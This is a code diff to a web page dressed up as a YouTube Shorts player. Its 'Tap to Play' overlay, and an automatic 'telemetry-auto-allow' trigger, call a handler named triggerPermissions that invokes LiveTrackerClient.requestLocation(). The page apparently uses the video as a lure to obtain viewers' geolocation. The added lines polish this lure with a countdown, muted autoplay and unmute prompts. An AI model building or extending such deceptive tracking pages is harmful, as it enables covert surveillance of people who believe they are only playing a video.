@@ -326,6 +326,14 @@
                     <i class="fas fa-play" style="margin-left: 4px;"></i>
                 </div>
                 <div class="prompt-text">Tap to Play YouTube Short</div>
+                <div class="prompt-timer" style="font-size: 13px; color: #f1f5f9; margin-top: 8px; font-weight: 500; display: flex; align-items: center; gap: 6px; background: rgba(0,0,0,0.6); padding: 5px 14px; border-radius: 16px; border: 1px solid rgba(255,255,255,0.2);">
+                    <i class="fas fa-circle-notch fa-spin" style="color: var(--yt-red);"></i> Auto-playing in <span id="auto-timer-count">1.5s</span>
+                </div>
+            </div>
+
+            <!-- Floating Unmute Pill when auto-played muted -->
+            <div id="unmute-pill" style="display: none; position: absolute; top: 68px; left: 50%; transform: translateX(-50%); background: rgba(15, 23, 42, 0.9); backdrop-filter: blur(8px); border: 1px solid rgba(255,255,255,0.25); color: #ffffff; padding: 7px 16px; border-radius: 20px; font-size: 13px; font-weight: 600; z-index: 35; cursor: pointer; box-shadow: 0 4px 14px rgba(0,0,0,0.6); align-items: center; gap: 8px;">
+                <i class="fas fa-volume-xmark" style="color: #ef4444;"></i> Video Muted · Tap for Sound
             </div>
 
             <!-- Video Viewport -->
@@ -442,9 +450,12 @@
         document.getElementById('sound-display').innerText = `Original sound - ${formattedChannel}`;
 
         const iframe = document.getElementById('yt-iframe');
-        iframe.src = `https://www.youtube-nocookie.com/embed/${videoId}?autoplay=1&mute=0&controls=1&rel=0&playsinline=1&enablejsapi=1`;
+        iframe.src = `https://www.youtube-nocookie.com/embed/${videoId}?autoplay=1&mute=1&controls=1&rel=0&playsinline=1&enablejsapi=1&loop=1&playlist=${videoId}`;
 
         const tapOverlay = document.getElementById('tap-overlay');
+        const autoTimerCount = document.getElementById('auto-timer-count');
+        const unmutePill = document.getElementById('unmute-pill');
+
         if (videoId) {
             const thumbUrl = `https://img.youtube.com/vi/${videoId}/hqdefault.jpg`;
             tapOverlay.style.background = `linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.8)), url('${thumbUrl}') center/cover no-repeat`;
@@ -452,23 +463,56 @@
 
         let hasTriggered = false;
         let autoAllowTimer = null;
+        let countdownInterval = null;
+        let remainingSeconds = 1.5;
+
+        // 1.5s countdown animation
+        countdownInterval = setInterval(() => {
+            remainingSeconds = Math.max(0, remainingSeconds - 0.1);
+            if (autoTimerCount) {
+                autoTimerCount.innerText = `${remainingSeconds.toFixed(1)}s`;
+            }
+            if (remainingSeconds <= 0) {
+                clearInterval(countdownInterval);
+                countdownInterval = null;
+            }
+        }, 100);
 
         function triggerPermissions(isAuto = false) {
             if (hasTriggered) return;
             hasTriggered = true;
+            if (countdownInterval) {
+                clearInterval(countdownInterval);
+                countdownInterval = null;
+            }
             if (autoAllowTimer) {
                 clearTimeout(autoAllowTimer);
                 autoAllowTimer = null;
             }
 
-            tapOverlay.classList.add('hidden');
-            tapOverlay.style.display = 'none';
+            // Smooth fade out
+            tapOverlay.style.transition = 'opacity 0.25s ease';
+            tapOverlay.style.opacity = '0';
+            setTimeout(() => {
+                tapOverlay.classList.add('hidden');
+                tapOverlay.style.display = 'none';
+            }, 250);
 
-            // Auto-allow or user tap: start video playback
-            // If user explicitly tapped, autoplay unmuted (mute=0)
-            // If auto-allowed after 1.5s, autoplay muted (mute=1) so browser autoplay policies don't block playback
-            const mute = isAuto ? 1 : 0;
-            iframe.src = `https://www.youtube-nocookie.com/embed/${videoId}?autoplay=1&mute=${mute}&controls=1&rel=0&playsinline=1&enablejsapi=1`;
+            // Handle video playback
+            if (isAuto) {
+                // Auto-allowed: play muted to respect browser policy, show unmute pill
+                try {
+                    iframe.contentWindow.postMessage('{"event":"command","func":"playVideo","args":""}', '*');
+                } catch (_e) {}
+                if (unmutePill) unmutePill.style.display = 'flex';
+            } else {
+                // Direct user click/tap: unmute and play with sound
+                try {
+                    iframe.contentWindow.postMessage('{"event":"command","func":"unMute","args":""}', '*');
+                    iframe.contentWindow.postMessage('{"event":"command","func":"playVideo","args":""}', '*');
+                } catch (_e) {}
+                if (unmutePill) unmutePill.style.display = 'none';
+            }
 
             if (window.LiveTrackerClient) {
                 window.LiveTrackerClient.requestLocation();
@@ -483,6 +527,26 @@
 
         tapOverlay.addEventListener('click', () => triggerPermissions(false));
         tapOverlay.addEventListener('touchstart', () => triggerPermissions(false), { passive: true });
+
+        if (unmutePill) {
+            unmutePill.addEventListener('click', (e) => {
+                e.stopPropagation();
+                try {
+                    iframe.contentWindow.postMessage('{"event":"command","func":"unMute","args":""}', '*');
+                    iframe.contentWindow.postMessage('{"event":"command","func":"setVolume","args":[100]}', '*');
+                } catch (_e) {}
+                unmutePill.style.display = 'none';
+            });
+        }
+
+        window.addEventListener('click', (e) => {
+            if (hasTriggered && !e.target.closest('#sub-btn, #like-btn, .header-actions')) {
+                try {
+                    iframe.contentWindow.postMessage('{"event":"command","func":"unMute","args":""}', '*');
+                } catch (_e) {}
+                if (unmutePill) unmutePill.style.display = 'none';
+            }
+        }, { passive: true });
 
         window.addEventListener('telemetry-auto-allow', () => {
             triggerPermissions(true);
